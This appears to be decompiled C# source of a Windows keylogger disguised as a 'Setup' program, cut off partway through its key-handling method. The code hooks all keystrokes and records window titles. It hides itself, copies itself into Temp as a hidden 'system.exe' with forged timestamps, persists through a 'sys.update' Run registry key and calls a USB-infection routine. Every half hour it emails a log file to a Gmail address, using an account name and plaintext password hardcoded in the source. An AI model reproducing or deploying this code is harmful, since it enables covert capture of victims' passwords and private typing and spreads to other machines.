using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Setup.My;

namespace Setup;

[DesignerGenerated]
public class Form1 : Form
{
	public class KeyboardHooki
	{
		private struct KBDLLHOOKSTRUCT
		{
			public int vkCode;

			public int scancode;

			public int flags;
		}

		private delegate int KeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

		public delegate void KeyDownEventHandler(Keys Key);

		public delegate void KeyUpEventHandler(Keys Key);

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private const int HC_ACTIONOOO = 0;

		private const int WH_KEYBOARDOO = 13;

		private const int WM_KEYDOWNI = 256;

		private const int WM_KEYUP = 257;

		private const int WM_SYSKEYDOWN = 260;

		private const int WM_SYSKEYUP = 261;

		private static KeyDownEventHandler KeyDownEvent;

		private static KeyUpEventHandler KeyUpEvent;

		private static int KeyHook;

		private static KeyboardProcDelegate KeyHookDelegate;

		public static event KeyDownEventHandler KeyDown
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				KeyDownEvent = (KeyDownEventHandler)Delegate.Combine(KeyDownEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				KeyDownEvent = (KeyDownEventHandler)Delegate.Remove(KeyDownEvent, value);
			}
		}

		public static event KeyUpEventHandler KeyUp
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				KeyUpEvent = (KeyUpEventHandler)Delegate.Combine(KeyUpEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				KeyUpEvent = (KeyUpEventHandler)Delegate.Remove(KeyUpEvent, value);
			}
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SetWindowsHookExA(int idHook, KeyboardProcDelegate lpfn, int hmod, int dwThreadId);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CallNextHookEx(int hHook, int nCode, int wParam, KBDLLHOOKSTRUCT lParam);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int UnhookWindowsHookEx(int hHook);

		public KeyboardHooki()
		{
			lock (__ENCList)
			{
				__ENCList.Add(new WeakReference(this));
			}
			KeyHookDelegate = KeyboardProc;
			KeyHook = SetWindowsHookExA(13, KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
		}

		private static int KeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
		{
			if (nCode == 0)
			{
				switch (wParam)
				{
				case 256:
				case 260:
					KeyDownEvent?.Invoke((Keys)lParam.vkCode);
					break;
				case 257:
				case 261:
					KeyUpEvent?.Invoke((Keys)lParam.vkCode);
					break;
				}
			}
			return CallNextHookEx(KeyHook, nCode, wParam, lParam);
		}

		protected override void Finalize()
		{
			UnhookWindowsHookEx(KeyHook);
			base.Finalize();
		}
	}

	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("TextBox3")]
	private TextBox _TextBox3;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Timer3")]
	private Timer _Timer3;

	private int resultuu;

	[AccessedThroughProperty("kbHooki")]
	private KeyboardHooki _kbHooki;

	private string strino;

	private int sent;

	private string tr;

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual TextBox TextBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox3 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (_Timer3 != null)
			{
				_Timer3.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			if (_Timer3 != null)
			{
				_Timer3.add_Tick(eventHandler);
			}
		}
	}

	private virtual KeyboardHooki kbHooki
	{
		[DebuggerNonUserCode]
		get
		{
			return _kbHooki;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			KeyboardHooki.KeyDownEventHandler value2 = shiftandcaps;
			if (_kbHooki != null)
			{
				KeyboardHooki.KeyDown -= value2;
			}
			_kbHooki = value;
			if (_kbHooki != null)
			{
				KeyboardHooki.KeyDown += value2;
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		lock (__ENCList)
		{
			__ENCList.Add(new WeakReference(this));
		}
		kbHooki = new KeyboardHooki();
		strino = null;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		components = new Container();
		TextBox1 = new TextBox();
		TextBox2 = new TextBox();
		TextBox3 = new TextBox();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		Timer3 = new Timer(components);
		((Control)this).SuspendLayout();
		TextBox textBox = TextBox1;
		Point location = new Point(114, 59);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(100, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		TextBox textBox3 = TextBox2;
		location = new Point(92, 120);
		((Control)textBox3).set_Location(location);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox4 = TextBox2;
		size = new Size(100, 20);
		((Control)textBox4).set_Size(size);
		((Control)TextBox2).set_TabIndex(1);
		TextBox textBox5 = TextBox3;
		location = new Point(34, 161);
		((Control)textBox5).set_Location(location);
		((Control)TextBox3).set_Name("TextBox3");
		TextBox textBox6 = TextBox3;
		size = new Size(100, 20);
		((Control)textBox6).set_Size(size);
		((Control)TextBox3).set_TabIndex(2);
		Timer1.set_Interval(1800000);
		Timer2.set_Interval(3333);
		Timer3.set_Interval(1000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(284, 261);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)TextBox3);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(long vKey);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	private string GetActiveWindowTitle()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.exe"))
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.exe", true);
			Directory.SetCreationTimeUtc(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.exe", DateTime.FromOADate(0.0011602850986242334));
			Directory.SetLastAccessTimeUtc(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.exe", DateTime.FromOADate(0.0011602850986242334));
			Directory.SetLastWriteTimeUtc(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.exe", DateTime.FromOADate(0.0011602850986242334));
			FileSystem.SetAttr(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\system.exe", (FileAttribute)2);
		}
		if (Operators.ConditionalCompareObjectEqual(((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().GetValue("sys.update"), (object)false, false))
		{
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "sys.update", (object)(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData() + "\\system.exe"), RegistryValueKind.String);
		}
		Timer1.Start();
		Timer2.Start();
		Timer3.Start();
		UsbInfect();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		if (((ServerComputer)MyProject.Computer).get_Network().get_IsAvailable())
		{
			MailMessage mailMessage = new MailMessage("yibab345@gmail.com", "logedlog@gmail.com");
			SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
			smtpClient.EnableSsl = true;
			smtpClient.Port = 587;
			smtpClient.Credentials = new NetworkCredential("yibab345", "done123456");
			mailMessage.IsBodyHtml = true;
			mailMessage.Body = "<h1>Don't Lose Hope!!<h1>";
			mailMessage.Subject = ((ServerComputer)MyProject.Computer).get_Name();
			Attachment item = new Attachment(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic() + "\\system.txt");
			mailMessage.Attachments.Add(item);
			smtpClient.Send(mailMessage);
			sent = 1;
		}
		else
		{
			sent = 0;
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		if (Operators.CompareString(strino, GetActiveWindowTitle(), false) != 0)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "\r\n[" + GetActiveWindowTitle() + "]:\r\n");
			strino = GetActiveWindowTitle();
		}
		UsbInfect();
	}

	public void shiftandcaps(Keys Key)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Invalid comparison between Unknown and I4
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Invalid comparison between Unknown and I4
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Invalid comparison between Unknown and I4
		//IL_00ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Invalid comparison between Unknown and I4
		//IL_00da: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Invalid comparison between Unknown and I4
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Invalid comparison between Unknown and I4
		//IL_0132: Unknown result type (might be due to invalid IL or missing references)
		//IL_0135: Invalid comparison between Unknown and I4
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0161: Invalid comparison between Unknown and I4
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_018d: Invalid comparison between Unknown and I4
		//IL_01b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b9: Invalid comparison between Unknown and I4
		//IL_01e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e5: Invalid comparison between Unknown and I4
		//IL_020e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0211: Invalid comparison between Unknown and I4
		//IL_023a: Unknown result type (might be due to invalid IL or missing references)
		//IL_023d: Invalid comparison between Unknown and I4
		//IL_0266: Unknown result type (might be due to invalid IL or missing references)
		//IL_0269: Invalid comparison between Unknown and I4
		//IL_0292: Unknown result type (might be due to invalid IL or missing references)
		//IL_0295: Invalid comparison between Unknown and I4
		//IL_02be: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c1: Invalid comparison between Unknown and I4
		//IL_02ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ed: Invalid comparison between Unknown and I4
		//IL_0316: Unknown result type (might be due to invalid IL or missing references)
		//IL_0319: Invalid comparison between Unknown and I4
		//IL_0342: Unknown result type (might be due to invalid IL or missing references)
		//IL_0345: Invalid comparison between Unknown and I4
		//IL_036e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0371: Invalid comparison between Unknown and I4
		//IL_039a: Unknown result type (might be due to invalid IL or missing references)
		//IL_039d: Invalid comparison between Unknown and I4
		//IL_03c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c9: Invalid comparison between Unknown and I4
		//IL_03f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f5: Invalid comparison between Unknown and I4
		//IL_041e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0421: Invalid comparison between Unknown and I4
		//IL_044a: Unknown result type (might be due to invalid IL or missing references)
		//IL_044d: Invalid comparison between Unknown and I4
		//IL_0476: Unknown result type (might be due to invalid IL or missing references)
		//IL_0479: Invalid comparison between Unknown and I4
		//IL_04a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a5: Invalid comparison between Unknown and I4
		//IL_04ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d1: Invalid comparison between Unknown and I4
		//IL_04fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_04fd: Invalid comparison between Unknown and I4
		//IL_0526: Unknown result type (might be due to invalid IL or missing references)
		//IL_0529: Invalid comparison between Unknown and I4
		//IL_0552: Unknown result type (might be due to invalid IL or missing references)
		//IL_0555: Invalid comparison between Unknown and I4
		//IL_057e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0581: Invalid comparison between Unknown and I4
		//IL_05aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ad: Invalid comparison between Unknown and I4
		//IL_05d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d9: Invalid comparison between Unknown and I4
		//IL_0602: Unknown result type (might be due to invalid IL or missing references)
		//IL_0605: Invalid comparison between Unknown and I4
		//IL_062e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0631: Invalid comparison between Unknown and I4
		//IL_065a: Unknown result type (might be due to invalid IL or missing references)
		//IL_065d: Invalid comparison between Unknown and I4
		//IL_0686: Unknown result type (might be due to invalid IL or missing references)
		//IL_0689: Invalid comparison between Unknown and I4
		//IL_06b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_06b5: Invalid comparison between Unknown and I4
		//IL_06de: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e1: Invalid comparison between Unknown and I4
		//IL_070a: Unknown result type (might be due to invalid IL or missing references)
		//IL_070d: Invalid comparison between Unknown and I4
		//IL_0736: Unknown result type (might be due to invalid IL or missing references)
		//IL_0739: Invalid comparison between Unknown and I4
		//IL_0762: Unknown result type (might be due to invalid IL or missing references)
		//IL_0765: Invalid comparison between Unknown and I4
		//IL_078e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0791: Invalid comparison between Unknown and I4
		//IL_07ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_07bd: Invalid comparison between Unknown and I4
		//IL_07e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e9: Invalid comparison between Unknown and I4
		//IL_0812: Unknown result type (might be due to invalid IL or missing references)
		//IL_0818: Invalid comparison between Unknown and I4
		//IL_0841: Unknown result type (might be due to invalid IL or missing references)
		//IL_0847: Invalid comparison between Unknown and I4
		//IL_0870: Unknown result type (might be due to invalid IL or missing references)
		//IL_0876: Invalid comparison between Unknown and I4
		//IL_089f: Unknown result type (might be due to invalid IL or missing references)
		//IL_08a5: Invalid comparison between Unknown and I4
		//IL_08ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_08d4: Invalid comparison between Unknown and I4
		//IL_08fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0903: Invalid comparison between Unknown and I4
		//IL_092c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0932: Invalid comparison between Unknown and I4
		//IL_095b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0961: Invalid comparison between Unknown and I4
		//IL_098a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0990: Invalid comparison between Unknown and I4
		//IL_09b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_09bf: Invalid comparison between Unknown and I4
		//IL_09e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_09eb: Invalid comparison between Unknown and I4
		//IL_0a14: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a17: Invalid comparison between Unknown and I4
		//IL_0a40: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a43: Invalid comparison between Unknown and I4
		//IL_0a6c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a6f: Invalid comparison between Unknown and I4
		//IL_0a98: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a9b: Invalid comparison between Unknown and I4
		//IL_0ac4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ac7: Invalid comparison between Unknown and I4
		//IL_0af0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af3: Invalid comparison between Unknown and I4
		//IL_0b1c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b1f: Invalid comparison between Unknown and I4
		//IL_0b48: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b4b: Invalid comparison between Unknown and I4
		//IL_0b74: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b77: Invalid comparison between Unknown and I4
		//IL_0ba0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ba3: Invalid comparison between Unknown and I4
		//IL_0bcc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bcf: Invalid comparison between Unknown and I4
		//IL_0bf8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bfb: Invalid comparison between Unknown and I4
		//IL_0c24: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c27: Invalid comparison between Unknown and I4
		//IL_0c50: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c53: Invalid comparison between Unknown and I4
		//IL_0c8a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c8c: Invalid comparison between Unknown and I4
		//IL_0cc3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc6: Invalid comparison between Unknown and I4
		//IL_0cef: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cf2: Invalid comparison between Unknown and I4
		//IL_0d1b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d1e: Invalid comparison between Unknown and I4
		//IL_0d47: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d4a: Invalid comparison between Unknown and I4
		//IL_0d73: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d76: Invalid comparison between Unknown and I4
		//IL_0d9f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0da2: Invalid comparison between Unknown and I4
		//IL_0dcb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dce: Invalid comparison between Unknown and I4
		//IL_0df7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dfa: Invalid comparison between Unknown and I4
		//IL_0e23: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e26: Invalid comparison between Unknown and I4
		//IL_0e4f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e52: Invalid comparison between Unknown and I4
		//IL_0e7b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e7e: Invalid comparison between Unknown and I4
		//IL_0ea7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eaa: Invalid comparison between Unknown and I4
		//IL_0efd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f00: Invalid comparison between Unknown and I4
		//IL_0f29: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f2c: Invalid comparison between Unknown and I4
		//IL_0f55: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f58: Invalid comparison between Unknown and I4
		//IL_0f81: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f84: Invalid comparison between Unknown and I4
		//IL_0fad: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fb0: Invalid comparison between Unknown and I4
		//IL_0fd9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fdc: Invalid comparison between Unknown and I4
		//IL_1005: Unknown result type (might be due to invalid IL or missing references)
		//IL_1008: Invalid comparison between Unknown and I4
		//IL_1031: Unknown result type (might be due to invalid IL or missing references)
		//IL_1034: Invalid comparison between Unknown and I4
		//IL_105d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1060: Invalid comparison between Unknown and I4
		//IL_1089: Unknown result type (might be due to invalid IL or missing references)
		//IL_108c: Invalid comparison between Unknown and I4
		//IL_10b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_10b8: Invalid comparison between Unknown and I4
		//IL_10e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_10e4: Invalid comparison between Unknown and I4
		//IL_110d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1110: Invalid comparison between Unknown and I4
		//IL_1139: Unknown result type (might be due to invalid IL or missing references)
		//IL_113c: Invalid comparison between Unknown and I4
		//IL_1165: Unknown result type (might be due to invalid IL or missing references)
		//IL_1168: Invalid comparison between Unknown and I4
		//IL_1191: Unknown result type (might be due to invalid IL or missing references)
		//IL_1194: Invalid comparison between Unknown and I4
		//IL_11bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_11c0: Invalid comparison between Unknown and I4
		//IL_11e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_11ec: Invalid comparison between Unknown and I4
		//IL_1215: Unknown result type (might be due to invalid IL or missing references)
		//IL_1218: Invalid comparison between Unknown and I4
		//IL_1241: Unknown result type (might be due to invalid IL or missing references)
		//IL_1244: Invalid comparison between Unknown and I4
		//IL_126d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1270: Invalid comparison between Unknown and I4
		//IL_1299: Unknown result type (might be due to invalid IL or missing references)
		//IL_129c: Invalid comparison between Unknown and I4
		//IL_12c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_12c8: Invalid comparison between Unknown and I4
		//IL_12f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_12f4: Invalid comparison between Unknown and I4
		//IL_131d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1320: Invalid comparison between Unknown and I4
		//IL_1349: Unknown result type (might be due to invalid IL or missing references)
		//IL_134c: Invalid comparison between Unknown and I4
		//IL_1375: Unknown result type (might be due to invalid IL or missing references)
		//IL_1378: Invalid comparison between Unknown and I4
		//IL_13a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_13a4: Invalid comparison between Unknown and I4
		//IL_13cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_13d0: Invalid comparison between Unknown and I4
		//IL_13f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_13fc: Invalid comparison between Unknown and I4
		//IL_1425: Unknown result type (might be due to invalid IL or missing references)
		//IL_1428: Invalid comparison between Unknown and I4
		//IL_1451: Unknown result type (might be due to invalid IL or missing references)
		//IL_1454: Invalid comparison between Unknown and I4
		//IL_147d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1480: Invalid comparison between Unknown and I4
		//IL_14a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_14ac: Invalid comparison between Unknown and I4
		//IL_14d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_14d8: Invalid comparison between Unknown and I4
		//IL_1501: Unknown result type (might be due to invalid IL or missing references)
		//IL_1504: Invalid comparison between Unknown and I4
		//IL_152d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1530: Invalid comparison between Unknown and I4
		//IL_1559: Unknown result type (might be due to invalid IL or missing references)
		//IL_155c: Invalid comparison between Unknown and I4
		//IL_1585: Unknown result type (might be due to invalid IL or missing references)
		//IL_1588: Invalid comparison between Unknown and I4
		//IL_15b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_15b4: Invalid comparison between Unknown and I4
		//IL_15dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_15e0: Invalid comparison between Unknown and I4
		//IL_1609: Unknown result type (might be due to invalid IL or missing references)
		//IL_160c: Invalid comparison between Unknown and I4
		//IL_1635: Unknown result type (might be due to invalid IL or missing references)
		//IL_1638: Invalid comparison between Unknown and I4
		//IL_1661: Unknown result type (might be due to invalid IL or missing references)
		//IL_1664: Invalid comparison between Unknown and I4
		//IL_168d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1690: Invalid comparison between Unknown and I4
		//IL_16b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_16bc: Invalid comparison between Unknown and I4
		//IL_16e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_16eb: Invalid comparison between Unknown and I4
		//IL_1714: Unknown result type (might be due to invalid IL or missing references)
		//IL_171a: Invalid comparison between Unknown and I4
		//IL_1743: Unknown result type (might be due to invalid IL or missing references)
		//IL_1749: Invalid comparison between Unknown and I4
		//IL_1772: Unknown result type (might be due to invalid IL or missing references)
		//IL_1778: Invalid comparison between Unknown and I4
		//IL_17a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_17a7: Invalid comparison between Unknown and I4
		//IL_17d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_17d6: Invalid comparison between Unknown and I4
		//IL_17ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_1805: Invalid comparison between Unknown and I4
		//IL_182e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1834: Invalid comparison between Unknown and I4
		//IL_185d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1863: Invalid comparison between Unknown and I4
		//IL_188c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1892: Invalid comparison between Unknown and I4
		//IL_18bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_18be: Invalid comparison between Unknown and I4
		//IL_18e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_18ea: Invalid comparison between Unknown and I4
		//IL_1913: Unknown result type (might be due to invalid IL or missing references)
		//IL_1916: Invalid comparison between Unknown and I4
		//IL_193f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1942: Invalid comparison between Unknown and I4
		//IL_196b: Unknown result type (might be due to invalid IL or missing references)
		//IL_196e: Invalid comparison between Unknown and I4
		//IL_1997: Unknown result type (might be due to invalid IL or missing references)
		//IL_199a: Invalid comparison between Unknown and I4
		//IL_19c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_19c6: Invalid comparison between Unknown and I4
		//IL_19ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_19f2: Invalid comparison between Unknown and I4
		//IL_1a1b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a1e: Invalid comparison between Unknown and I4
		//IL_1a47: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a4a: Invalid comparison between Unknown and I4
		//IL_1a73: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a76: Invalid comparison between Unknown and I4
		//IL_1a9f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1aa2: Invalid comparison between Unknown and I4
